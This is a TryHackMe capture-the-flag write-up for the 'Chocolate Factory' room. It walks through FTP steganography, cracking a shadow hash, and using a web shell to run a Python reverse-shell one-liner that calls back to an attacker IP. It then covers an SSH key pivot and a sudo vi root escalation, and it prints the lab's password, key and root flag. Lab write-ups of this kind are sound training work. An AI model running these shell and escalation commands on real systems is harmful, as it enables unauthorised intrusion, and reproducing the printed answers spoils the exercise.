# 🍫 Chocolate Factory — TryHackMe Write-Up

> *"A Charlie And The Chocolate Factory themed room"*  
> **Difficulty:** Easy | **Platform:** TryHackMe | **Date:** March 2026

---

## 📋 Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [FTP Enumeration & Steganography](#2-ftp-enumeration--steganography)
3. [Hash Cracking](#3-hash-cracking)
4. [Web Application & Reverse Shell](#4-web-application--reverse-shell)
5. [Privilege Escalation to Charlie](#5-privilege-escalation-to-charlie)
6. [Privilege Escalation to Root](#6-privilege-escalation-to-root)
7. [Flags](#7-flags)
8. [Summary](#8-summary)

---

## 1. Reconnaissance

Started with a full Nmap scan to discover open ports and services:

```bash
nmap -sCV -O -Pn -oA nmap-result <TARGET_IP>
```

### Results

| Port | Service | Notes |
|------|---------|-------|
| 21   | FTP (vsftpd 3.0.5) | ⚠️ Anonymous login allowed |
| 22   | SSH (OpenSSH 8.2p1) | Standard SSH |
| 80   | HTTP (Apache 2.4.41) | Login page |
| 113  | ident? | 🔑 Hidden hint |
| 100, 106–125 | Unknown | Decoy ports — all return "Look somewhere else!" |

### Key Finding on Port 113

The banner on port 113 revealed a critical hint:

```
http://localhost/key_rev_key <- You will find the key here!!!
```

> **Note:** Most ports were decoys designed to distract. The real attack surface was ports **21**, **80**, and **113**.

---

## 2. FTP Enumeration & Steganography

### Anonymous FTP Login

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (empty)

ftp> get gum_room.jpg
```

Downloaded `gum_room.jpg` — a suspicious image file.

### Steganography with Steghide

Used `steghide` to extract hidden data from the image:

```bash
steghide extract -sf gum_room.jpg -v
# Passphrase: (empty — just press Enter)
```

**Output:** `b64.txt` was extracted.

### Decoding the Hidden Data

The file contained base64-encoded content:

```bash
cat b64.txt | base64 -d
```

**Result:** The decoded content was `/etc/shadow` — containing system password hashes, including:

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

---

## 3. Hash Cracking

The hash type `$6$` is **SHA-512**. Used John the Ripper with the rockyou wordlist:

```bash
echo 'charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC...' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show
```

**Cracked Password:** `cn7824`

---

## 4. Web Application & Reverse Shell

### Web Login

Navigated to `http://<TARGET_IP>` — found a login form (`validate.php`).

After inspecting `validate.php` source, confirmed credentials are hardcoded:
- **Username:** `charlie`
- **Password:** `cn7824`

Logged in successfully → landed on a **Web Shell** (command execution panel).

### Getting a Reverse Shell

**On attacker machine:**
```bash
nc -lvnp 4444
```

**Through the web shell:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Result:** Got a shell as `www-data`.

### Key Discovery

While exploring, downloaded and ran the `key_rev_key` binary:

```bash
wget http://<TARGET_IP>/key_rev_key
chmod +x key_rev_key
strings key_rev_key   # Found the secret name: laksdhfas
./key_rev_key
# Enter your name: laksdhfas
```

**Key:** `-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=`

---

## 5. Privilege Escalation to Charlie

### SSH Private Key

Found an SSH private key in Charlie's home directory:

```bash
ls /home/charlie/
# teleport  teleport.pub  user.txt
cat /home/charlie/teleport
```

Saved the private key locally and connected via SSH:

```bash
chmod 600 teleport
ssh -i teleport charlie@<TARGET_IP>
```

**Result:** Shell as `charlie` ✅

---

## 6. Privilege Escalation to Root

### Sudo Enumeration

```bash
sudo -l
# (ALL) /usr/bin/vi
```

Charlie can run `vi` as root — classic GTFOBins exploit!

**Reference:** [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/)

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

**Result:** Root shell ✅

### Root Flag Decryption

Found `root.py` in `/root/` — a Fernet-encrypted message requiring the key found earlier.

Fixed the script to handle Python3 bytes encoding:

```python
from cryptography.fernet import Fernet

key = input("Enter the key:  ")
f = Fernet(key.encode())
encrypted_mess = b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess = f.decrypt(encrypted_mess)
print(dcrypt_mess.decode())
```

```bash
python3 root.py
# Enter the key: -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

---

## 7. Flags

| Flag | Value |
|------|-------|
| 🔑 Key | `-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=` |
| 👤 User Flag | *(found in `/home/charlie/user.txt`)* |
| 🏆 Root Flag | `flag{cec59161d338fef787fcb4e296b42124}` |

---

## 8. Summary

### Attack Chain

```
Nmap Scan
    │
    ├─► Port 21 (FTP Anonymous)
    │       └─► gum_room.jpg → steghide → b64.txt → /etc/shadow
    │                                                     └─► john → cn7824
    │
    ├─► Port 80 (Web App)
    │       └─► Login (charlie:cn7824) → Web Shell → Reverse Shell (www-data)
    │
    ├─► Port 113 (Hint)
    │       └─► /key_rev_key → strings → "laksdhfas" → Fernet Key
    │
    └─► /home/charlie/ → SSH Private Key → charlie
                                               └─► sudo vi → ROOT
                                                               └─► root.py → Root Flag
```

### Lessons Learned

- **Decoy ports** are a common CTF trick — don't waste time on everything Nmap finds.
- **Steganography** (`steghide`) is often used to hide sensitive data inside image files.
- **`strings`** on binary executables can reveal hardcoded secrets.
- **SSH private keys** are an alternative to passwords — always check `/home/user/` for them.
- **GTFOBins** (`vi` sudo exploit) is a fundamental PrivEsc technique worth memorizing.
- **Fernet encryption** requires keys and tokens to be passed as `bytes`, not `str` in Python3.

---

*Write-up by [XENOS](https://obadahamed.github.io) | Part of the 52-Week Red Team Roadmap*
